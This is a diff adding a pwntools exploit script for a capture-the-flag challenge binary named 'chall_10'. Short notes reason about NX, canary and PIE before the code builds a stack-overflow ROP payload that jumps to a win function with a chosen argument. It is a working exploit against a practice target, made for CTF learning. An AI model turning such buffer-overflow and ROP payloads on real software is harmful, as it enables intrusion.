@@ -17,8 +17,26 @@ afl --> list all functions
 Vulns:
     Not shell code since NX is on, but no canary or PIE?
     Also printf so maybe a printf vuln ---> tried, does not work so maybe stack smashing?
+    Well looks like a ROP, since vuln and win func, probably needs an arg?
+        Arg for Win ROP ---> 0x1a55fac3
 '''
 
 # Import Libaries
 from pwn import *
 
+# Padding to smash
+offset = int("0x308",16)
+pad = b'a' * offset # 308h to overwrite then + 4 for ebp to get to eip
+padOverBP = b'z'*4
+print("LEN OF PAD: ", len(pad))
+
+# Address of win + Gadgets + func arg
+winAddr = p32(0x080491d6)       # Only ble to find due to no PIE --> rabin2 -s
+popGad = p32(0x08049303)        # : pop ebp ; ret
+winArg = p32(0x1a55fac3)
+
+# Start process and send line
+p=process("./chall_10")
+payload = pad + padOverBP + winAddr + popGad + winArg
+p.send(payload)
+p.interactive()
